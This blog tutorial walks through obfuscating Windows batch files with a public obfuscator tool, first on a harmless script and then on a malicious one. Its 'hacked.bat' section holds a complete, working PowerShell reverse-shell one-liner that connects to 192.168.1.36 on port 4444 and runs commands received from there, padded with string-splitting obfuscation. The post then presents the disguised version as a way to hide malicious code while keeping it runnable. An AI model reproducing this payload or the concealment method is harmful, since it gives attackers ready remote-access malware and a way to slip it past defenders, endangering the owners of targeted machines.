---
title:  "Batch Obfuscation"
categories: [jekyll]
#tags: [jekyll]
---

Hi! We are talking about Batch Obfuscation.

As we know Batch Obfuscation techniques, hackers always using encrypt or hiding their malicious code. We will getting deeply this techniques and talking about Batch Obfuscation.

## What We Need?
Firstly, we need a windows machine for using Batch Obfuscation and secondly we need Batch Obfuscator Framework. İf you don't have a any Batch Obfuscator tool or framework. You can install this resource on your windows machine. It will change every words to Chines words.

``` ruby
https://github.com/BiggerDABOSS/BatchObfuscator
```
If you clone this repository then we can ready to use. Let's test BatchObbuscator!
I want to try on simple batch code. I am creating test.bat file and write this sample code

``` ruby
@echo off
title this is your first batch script.
echo Welcome to batch scripting.
pause
```
Open up a new CMD console, then you can use like this.

``` ruby
C:\Users\furka\Desktop\batchwrite\BatchObfuscator-master>test.bat
Welcome to batch scripting.
Press any key to continue . . .
The batch file cannot be found.

C:\Users\furka\Desktop\batchwrite\BatchObfuscator-master>
```
Let's test what changes in our content using Batch Obfuscator

``` ruby
C:\Users\furka\Desktop\batchwrite\BatchObfuscator-master>obfuscator.cmd test.bat
Input Length = 14
Output Length = 8
CertUtil: -decode command completed successfully.
testo.bat
test.bat
        1 file(s) copied.
```

If we open new "testo.bat" file with any text editor, we can see Chinese characters!

```ruby
挦獬਍敀档⁯景൦琊瑩敬琠楨⁳獩礠畯⁲楦獲⁴慢捴捳楲瑰മ攊档⁯敗捬浯⁥潴戠瑡档猠牣灩楴杮മ瀊畡敳
```

### Running "testo.bat" in CMD

```ruby
C:\Users\furka\Desktop\batchwrite\BatchObfuscator-master>testo.bat
```


```ruby
Welcome to batch scripting.
Press any key to continue . . .

```

We can see the same output. That's meaning, Batch Obfuscator is running excellent!

### Real Life Sample

We're see on this sample, Batch Obfuscator tool just chancing every characters to Chinese characters. But nothing chanced on running time.
Then we can say, if I can use for a malicious code nothing will be happened. Let's try and see what happening.
I will use Kali Linux for creating a malicious code. You can create it any way you want. 'Please Just Use For Educational Purpose!'

I' m create malicious code and giving name to 'hacked.bat' then getting reverse shell on CMD. I'm listening on 4444 port.

### hacked.bat

```ruby

cMD.EXe/C"SET  swx=Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("192.168.1.36",4444));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535^|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2^>^&1 ^| Out-String );Set-Variable -Name sendback2 -Value ($sendback + "PS " + (pwd).Path + "^> ");Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&& C:\windOws\sySWoW64\WINDOwsPowERSHelL\v1.0\PoWerShEll.EXe     ^&  ( 'Sv'  )  (\"{1}{0}\"-f 'Y3','4' ) (  [tyPE](\"{0}{3}{1}{2}\" -f'eNv','ME','Nt','iroN')   )    ;   (   (  ^&  (  \"{0}{2}{1}\"-f 'c','ItEM','hiLD' )  ( \"{1}{0}{3}{2}\" -f 'BLe','Varia','y3',':4')  ).\"Va`lUe\"::( \"{4}{5}{3}{0}{2}{1}\"-f 'Ia','E','bl','EnvIroNmEntvAR','ge','t'  ).Invoke(  'SWx',(  \"{0}{1}{2}\" -f'Pr','O','cEss'  ))  )^| ^& (   ${ShEL`lId}[1] +${Sh`EL`lID}[13]  + 'x')"

```

Now we can test on 'hacked.bat'. Here is the results:

```ruby
C:\Users\furka\Desktop\batchwrite\BatchObfuscator-master>obfuscator.cmd hacked.bat
Input Length = 14
Output Length = 8
CertUtil: -decode command completed successfully.
hackedo.bat
hacked.bat
        1 file(s) copied.
```

Name is changeced to 'hackedo.bat'. Let's open the file with any text editor.

### hackedo.bat

```ruby
挦獬਍䵣⹄塅⽥≃䕓⁔猠硷匽瑥嘭牡慩汢⁥中浡⁥汣敩瑮ⴠ慖畬⁥丨睥伭橢捥⁴祓瑳浥丮瑥匮捯敫獴吮偃汃敩瑮∨㤱⸲㘱⸸⸱㘳Ⱒ㐴㐴⤩医瑥嘭牡慩汢⁥中浡⁥瑳敲浡ⴠ慖畬⁥␨汣敩瑮䜮瑥瑓敲浡⤨㬩扛瑹孥嵝戤瑹獥㴠〠⸮㔶㌵帵╼ほ㭽桷汩⡥匨瑥嘭牡慩汢⁥中浡⁥嘭污敵⠠猤牴慥⹭敒摡␨祢整ⱳ〠戤瑹獥䰮湥瑧⥨⤩ⴠ敮〠笩医瑥嘭牡慩汢⁥中浡⁥慤慴ⴠ慖畬⁥⠨敎⵷扏敪瑣ⴠ祔数慎敭匠獹整⹭敔瑸䄮䍓䥉湅潣楤杮⸩敇却牴湩⡧戤瑹獥〬椤⤩医瑥嘭牡慩汢⁥中浡⁥敳摮慢正ⴠ慖畬⁥椨硥␠慤慴㈠㹞♞‱籞传瑵匭牴湩㬩敓⵴慖楲扡敬ⴠ慎敭猠湥扤捡㉫ⴠ慖畬⁥␨敳摮慢正⬠∠卐∠⬠⠠睰⥤倮瑡帢‾⤢医瑥嘭牡慩汢⁥中浡⁥敳摮祢整ⴠ慖畬⁥⠨瑛硥⹴湥潣楤杮㩝䄺䍓䥉⸩敇䉴瑹獥␨敳摮慢正⤲㬩猤牴慥⹭牗瑩⡥猤湥扤瑹ⱥⰰ猤湥扤瑹⹥敌杮桴㬩猤牴慥⹭汆獵⡨紩␻汣敩瑮䌮潬敳⤨☦䌠尺楷摮睏屳祳坓坯㐶坜义佄獷潐䕷卒效䱬癜⸱尰潐敗卲䕨汬䔮敘††帠…⠠✠癓‧⤠†尨笢紱ほ屽ⴢ大✳✬✴⤠⠠†瑛偹嵅尨笢細㍻筽紱㉻屽•昭攧癎Ⱗ䴧❅✬瑎Ⱗ椧潲❎††㬠†⠠†⠠†♞†尠笢細㉻筽紱≜昭✠❣✬瑉䵅Ⱗ栧䱩❄⤠†≜ㅻ筽細㍻筽紲≜ⴠ䈧敌Ⱗ嘧牡慩Ⱗ礧✳✬㐺⤧†⸩≜慖池敕≜㨺≜㑻筽紵㍻筽細㉻筽紱≜昭✠慉Ⱗ䔧Ⱗ戧❬✬湅䥶潲济湅癴剁Ⱗ朧❥✬❴†⸩湉潶敫✠坓❸⠬†≜ほ筽紱㉻屽•昭倧❲✬❏✬䕣獳‧⤠⤠籞帠…†笤桓䱅池摉孽崱⬠笤桓䕠恌䥬組ㅛ崳†砧⤧•††††††††††††††††††††††††††††††††††††††††
```

We are see the Chinese characters. If I run the 'hacked.bat' I can get a reverse shell on CMD.

Thanks for reading, I hope you learned something.
